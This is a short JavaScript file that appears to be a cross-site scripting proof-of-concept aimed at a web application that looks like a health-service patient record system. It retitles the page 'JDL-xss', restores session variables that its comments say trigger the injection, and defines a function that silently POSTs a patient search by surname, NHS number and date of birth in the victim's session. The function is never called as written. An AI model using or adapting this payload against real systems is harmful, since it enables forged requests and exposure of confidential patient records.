//BEGIN - Update Title for confirmation script loaded

document.title = "JDL-xss"

//Put Back the variable used to invoke the XSS
//Script damaged!
var websession  = '1';
var mysessionno  = '1';
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var LastRefresh = TimeAsMS;
var timeoutlength = 9999000;


async () => {
 const xhr = new XMLHttpRequest();
 xhr.open("POST", "/nimstrain/webform.csp?screen=webpscps.csp", true);
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhr.send("webPSnhs=&webPSotherid=&webPSsurname=smith&webPSforename=&webPSmidname=&webPSdob=&webPSsex=&webSubmitBTN=%A0%A0%A0%A0Find%A0%A0%A0%A0&webPSsurnameincother=1&webPSaddress=&webPSpcode=&webPSgp=&webPSorg=1&displaydeswebPSorg=Top+Level&webPSorderby=webPRnamstr&Update=1&Submit=submitFind&webPSsearchtitle=&webPSresultstitle=&webSTORE=&webPSidall=&websession=1");
}
